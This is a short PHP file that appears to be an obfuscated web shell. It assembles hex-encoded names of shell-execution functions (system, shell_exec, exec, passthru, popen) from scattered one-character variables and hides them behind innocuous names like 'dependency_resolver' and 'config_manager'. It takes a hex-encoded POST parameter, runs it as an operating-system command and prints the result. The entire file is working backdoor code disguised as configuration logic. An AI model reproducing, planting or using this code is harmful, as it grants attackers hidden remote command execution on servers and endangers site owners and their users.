<?php


$mrk1 = '7';
$mrk2 = '3';
$mrk3 = '6';
$mrk4 = '5';
$mrk5 = '8';
$mrk6 = 'c';
$mrk7 = 'f';
$mrk8 = '0';
$mrk9 = '1';
$mrk10 = '4';
$mrk11 = 'd';
$mrk12 = 'e';
$dependency_resolver1 = pack("H*", '7'.'3'.$mrk1.'9'.'7'.$mrk2.$mrk1.'4'.$mrk3.$mrk4.'6'.'d');
$dependency_resolver2 = pack("H*", $mrk1.'3'.'6'.$mrk5.'6'.$mrk4.$mrk3.$mrk6.'6'.'c'.$mrk4.$mrk7.'6'.$mrk4.'7'.$mrk5.'6'.'5'.'6'.'3');
$dependency_resolver3 = pack("H*", $mrk3.$mrk4.$mrk1.$mrk5.$mrk3.'5'.$mrk3.'3');
$dependency_resolver4 = pack("H*", $mrk1.$mrk8.'6'.$mrk9.$mrk1.'3'.$mrk1.$mrk2.'7'.$mrk10.'6'.'8'.'7'.'2'.'7'.$mrk4);
$dependency_resolver5 = pack("H*", $mrk1.'0'.'6'.$mrk7.'7'.$mrk8.$mrk3.'5'.$mrk3.'e');
$dependency_resolver6 = pack("H*", $mrk1.$mrk2.$mrk1.'4'.$mrk1.'2'.'6'.$mrk4.'6'.$mrk9.$mrk3.$mrk11.$mrk4.'f'.'6'.$mrk1.'6'.'5'.'7'.$mrk10.$mrk4.'f'.'6'.'3'.$mrk3.'f'.$mrk3.$mrk12.$mrk1.$mrk10.'6'.$mrk4.'6'.'e'.$mrk1.'4'.$mrk1.'3');
$dependency_resolver7 = pack("H*", $mrk1.$mrk8.$mrk3.'3'.$mrk3.$mrk6.$mrk3.$mrk7.'7'.$mrk2.$mrk3.'5');
$config_manager = pack("H*", $mrk3.'3'.$mrk3.$mrk7.$mrk3.$mrk12.'6'.$mrk3.$mrk3.'9'.$mrk3.'7'.$mrk4.'f'.'6'.$mrk11.'6'.$mrk9.$mrk3.'e'.$mrk3.$mrk9.'6'.'7'.'6'.'5'.$mrk1.'2');
if (isset($_POST[$config_manager])) {
    $config_manager = pack("H*", $_POST[$config_manager]);
    if (function_exists($dependency_resolver1)) {
        $dependency_resolver1($config_manager);
    } elseif (function_exists($dependency_resolver2)) {
        print $dependency_resolver2($config_manager);
    } elseif (function_exists($dependency_resolver3)) {
        $dependency_resolver3($config_manager, $ent_binding);
        print join("\n", $ent_binding);
    } elseif (function_exists($dependency_resolver4)) {
        $dependency_resolver4($config_manager);
    } elseif (function_exists($dependency_resolver5) && function_exists($dependency_resolver6) && function_exists($dependency_resolver7)) {
        $symbol_object = $dependency_resolver5($config_manager, 'r');
        if ($symbol_object) {
            $fac_property_set = $dependency_resolver6($symbol_object);
            $dependency_resolver7($symbol_object);
            print $fac_property_set;
        }
    }
    exit;
}
